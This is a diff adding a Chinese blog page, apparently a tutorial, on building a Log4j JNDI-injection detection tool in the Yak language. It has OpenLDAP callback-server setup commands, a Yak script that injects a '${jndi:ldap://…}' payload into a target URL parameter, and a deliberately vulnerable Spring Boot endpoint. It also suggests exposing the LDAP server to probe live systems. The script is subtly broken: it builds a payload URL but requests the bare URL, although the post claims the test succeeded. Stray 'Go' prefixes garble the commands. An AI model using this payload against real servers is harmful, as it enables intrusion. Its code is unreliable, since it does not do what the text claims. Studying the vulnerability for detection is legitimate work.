@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>使用Yak搭建Log4j漏洞检测工具 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="使用Yak搭建Log4j漏洞检测工具" />
+<meta property="og:description" content="作者：@望川师傅
+Yak是什么
+Yak 是一门 Web 安全研发领域垂直语言。专为安全而生，致力于安全能力融合的语言。内置多种网络安全模块。
+总之Yak是整合了当前多种安全工具和开源项目，让安全从业人员无需安装复杂的依赖，就能上手工作。可以使安全从业人员快速进行安全检测和脚本编写。
+官网地址：https://www.yaklang.io/
+Github地址：yaklang/yakit: Cyber Security ALL-IN-ONE Platform (http://github.com)
+由于本人接触这门语言时间不长，下面用Yak写一个简单的Log4j的检查工具。
+Log4j漏洞
+Log4j2 是一款 Java 日志记录框架。在Java开发中应用广泛。
+2021年11月下旬由一名中国工程师、阿里云安全团队的 陈兆军（音译）发现Log4j2存着JNDI注入漏洞。并提交Apache官方。
+该漏洞被称为：「互联网正在着火」「过去十年最严重的漏洞」「现代计算机历史上最大漏洞」「难以想到哪家公司不受影响」！
+漏洞利用流程如下：
+搭建漏洞利用环境
+由于Log4j漏洞的影响很多DNSLog平台纷纷屏蔽了LADP协议。所以为了方便起见，自己搭一个LADP环境，用于漏洞的检验
+yum 安装相关包 Go yum install -y openldap openldap-clients openldap-servers 复制一个默认配置到指定目录下,并授权，这一步一定要做，然后再启动服务，不然生产密码时会报错 Go cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 授权给ldap用户,此用户yum安装时便会自动创建 Go chown -R ldap. /var/lib/ldap/DB_CONFIG 启动服务，先启动服务，配置后面再进行修改 Gosystemctl start slapd systemctl enable slapd 查看状态，正常启动则ok Go systemctl status slapd 在slapd.conf中加一行： Go loglevel 4095 在/etc/rsyslog.conf 中加入ldap日志文档： Go local4.* /var/log/ldap.log 创建日志文件 Go touch /var/log/ldap." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/b70ae6bff6f50d1972c8f29c18ed44e9/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-07T11:20:12+08:00" />
+<meta property="article:modified_time" content="2023-11-07T11:20:12+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">使用Yak搭建Log4j漏洞检测工具</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p>作者：@望川师傅</p> 
+<p><strong>Yak是什么</strong></p> 
+<p>Yak 是一门 Web 安全研发领域垂直语言。专为安全而生，致力于安全能力融合的语言。内置多种网络安全模块。</p> 
+<p>总之Yak是整合了当前多种安全工具和开源项目，让安全从业人员无需安装复杂的依赖，就能上手工作。可以使安全从业人员快速进行安全检测和脚本编写。</p> 
+<p>官网地址：<a href="https://link.zhihu.com/?target=https%3A//www.yaklang.io/" rel="nofollow" title="https://www.yaklang.io/">https://www.yaklang.io/</a></p> 
+<p>Github地址：yaklang/yakit: Cyber Security ALL-IN-ONE Platform (<a href="https://link.zhihu.com/?target=http%3A//github.com" title="http://github.com">http://github.com</a>)</p> 
+<p>由于本人接触这门语言时间不长，下面用Yak写一个简单的Log4j的检查工具。</p> 
+<p><strong>Log4j漏洞</strong></p> 
+<p>Log4j2 是一款 Java 日志记录框架。在Java开发中应用广泛。</p> 
+<p>2021年11月下旬由一名中国工程师、阿里云安全团队的 陈兆军（音译）发现Log4j2存着JNDI注入漏洞。并提交Apache官方。</p> 
+<p>该漏洞被称为：「互联网正在着火」「过去十年最严重的漏洞」「现代计算机历史上最大漏洞」「难以想到哪家公司不受影响」！</p> 
+<p>漏洞利用流程如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="" height="678" src="https://images2.imgbox.com/b1/64/wpSxLi30_o.png" width="908"></p> 
+<p><strong>搭建漏洞利用环境</strong></p> 
+<p>由于Log4j漏洞的影响很多DNSLog平台纷纷屏蔽了LADP协议。所以为了方便起见，自己搭一个LADP环境，用于漏洞的检验</p> 
+<ol><li>yum 安装相关包</li></ol> 
+<table><tbody><tr><th>Go yum install -y openldap openldap-clients openldap-servers</th></tr></tbody></table> 
+<ol><li>复制一个默认配置到指定目录下,并授权，这一步一定要做，然后再启动服务，不然生产密码时会报错</li></ol> 
+<table><tbody><tr><th>Go cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</th></tr></tbody></table> 
+<ol><li>授权给ldap用户,此用户yum安装时便会自动创建</li></ol> 
+<table><tbody><tr><th>Go chown -R ldap. /var/lib/ldap/DB_CONFIG</th></tr></tbody></table> 
+<ol><li>启动服务，先启动服务，配置后面再进行修改</li></ol> 
+<table><tbody><tr><th>Gosystemctl start slapd systemctl enable slapd</th></tr></tbody></table> 
+<ol><li>查看状态，正常启动则ok</li></ol> 
+<table><tbody><tr><th>Go systemctl status slapd</th></tr></tbody></table> 
+<ol><li>在slapd.conf中加一行：</li></ol> 
+<table><tbody><tr><th>Go loglevel 4095</th></tr></tbody></table> 
+<ol><li>在/etc/rsyslog.conf 中加入ldap日志文档：</li></ol> 
+<table><tbody><tr><th>Go local4.* /var/log/ldap.log</th></tr></tbody></table> 
+<ol><li>创建日志文件</li></ol> 
+<table><tbody><tr><th>Go touch /var/log/ldap.log</th></tr></tbody></table> 
+<ol><li>重启 syslog和OpenLDAP</li></ol> 
+<table><tbody><tr><th>Gosystemctl restart rsyslog systemctl restart slapd</th></tr></tbody></table> 
+<ol><li>测试是否可通，随便找一台其他主机</li></ol> 
+<table><tbody><tr><th>Gotelnet OpenLDAP所在机器ip 389</th></tr></tbody></table> 
+<ol><li>查看 /var/log/ldap.log日志，发现日志中已经记录了访问的IP信息</li></ol> 
+<p></p> 
+<p class="img-center"><img alt="" height="158" src="https://images2.imgbox.com/6c/14/3WiVfa6M_o.png" width="876"></p> 
+<p><strong>使用Yak编写log4j扫描服务</strong></p> 
+<p>yak log4jScan.yak</p> 
+<p>-u 要注入的目的地址</p> 
+<p>-l 注入参数ldap地址（上一步搭建的）</p> 
+<p>-m 请求方法Get/Post（当前只支持Get，默认Get）</p> 
+<p>-p 参数名（一般像username之类的）</p> 
+<p>log4jScan.yak 内容如下：</p> 
+<table><tbody><tr><th>Go //获取ldap地址 raw = cli.String("l"); //拼接注入内容 payload = "${jndi:ldap://" + string(raw) +"/}" println("注入参数:"+string(payload)) //获取要扫描的URL url = cli.String("u") method = cli.String("m") params = cli.String("p") if params == "" { params = "v" } if method == "" { method = "Get" } //发送注入请求 if method == "Get" { code =codec.EncodeUrl(payload) urlurl = url+"?"+params+"="+code println("发送url:"+string(url)) rsp, err := http.Get( url, ) die(err) println() raw, err := io.ReadAll(rsp.Body) die(err) println(string(raw)) }</th></tr></tbody></table> 
+<p><strong>验证成果</strong></p> 
+<p>使用springboot简单搭建一个log4j漏洞环境，关键的漏洞处：</p> 
+<table><tbody><tr><th>Go @RequestMapping("/test") @ResponseBody public String quick(@RequestParam("v") String v) { LOG.error(v); return "hello SpringBoot !"; }</th></tr></tbody></table> 
+<p>yak log4jScan.yak -u <a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/test" rel="nofollow" title="http://127.0.0.1:8080/test">http://127.0.0.1:8080/test</a> -l 192.168.183.108:389</p> 
+<p></p> 
+<p class="img-center"><img alt="" height="92" src="https://images2.imgbox.com/7e/bb/2itKSBMR_o.png" width="421"></p> 
+<p>yakit控制台输出日志：</p> 
+<p></p> 
+<p class="img-center"><img alt="" height="137" src="https://images2.imgbox.com/51/db/j4NN8pBE_o.png" width="943"></p> 
+<p>查看OpenLDAP日志：</p> 
+<p></p> 
+<p class="img-center"><img alt="" height="192" src="https://images2.imgbox.com/f6/3e/f3OLPkMY_o.png" width="819"></p> 
+<p>日志中出现漏洞环境IP信息，验证证实可以通过log4jScan.yak文件对目标漏洞环境进行注入。</p> 
+<p><strong>结语</strong></p> 
+<p>当然，以上是用最简单的方式进行了Log4j的复现和检测，如果需要检测线上环境是否有漏洞，可以把OpenLDAP环境地址映射到外网。如果真的做成生产力工具，还需要考虑更多的情况，比如线程、参数等等，文章中的Yak代码也有优化的空间，最后可以ssh到日志环境，根据日志信息用字符串判断是否触发漏洞，达到Log4j漏洞判断的自动化。本文只是简单的应用，入门而已，Yak还有很多精彩的特性，作者也还在学习中。</p> 
+<h4><strong>Yak官方资源</strong></h4> 
+<p>Yak 语言官方教程：<br><em>https://yaklang.com/docs/intro/</em><br> Yakit 视频教程：<br><em>https://space.bilibili.com/437503777</em><br> Github下载地址：<br><em>https://github.com/yaklang/yakit</em><br> Yakit官网下载地址：<br><em>https://yaklang.com/</em><br> Yakit安装文档：<br><em>https://yaklang.com/products/download_and_install</em><br> Yakit使用文档：<br><em>https://yaklang.com/products/intro/</em><br> 常见问题速查：<br><em>https://yaklang.com/products/FAQ</em></p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/7fde68e85edf8a031e37da07b9bc0ad7/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Cocos 距离判断和小兵的攻击判定</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/ea8cbda438ab396cae187cf93db6dacd/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Cocos 进度条物体跟随效果</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
